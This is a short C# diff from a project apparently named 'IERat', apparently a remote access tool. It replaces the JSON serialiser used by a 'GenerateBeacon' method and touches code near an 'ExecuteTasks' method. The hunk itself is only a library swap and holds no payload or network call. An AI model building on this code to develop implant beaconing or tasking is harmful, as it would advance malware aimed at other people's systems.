@@ -4,8 +4,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Text;
-using System.Text.Json;
 using System.Threading.Tasks;
+using System.Web.Script.Serialization;
 
 namespace IERat
 {
@@ -33,7 +33,8 @@ namespace IERat
 
         public string GenerateBeacon()
         {
-            return JsonSerializer.Serialize(this);
+            JavaScriptSerializer js = new JavaScriptSerializer();
+            return js.Serialize(this);
         }
         public void ExecuteTasks()
         {
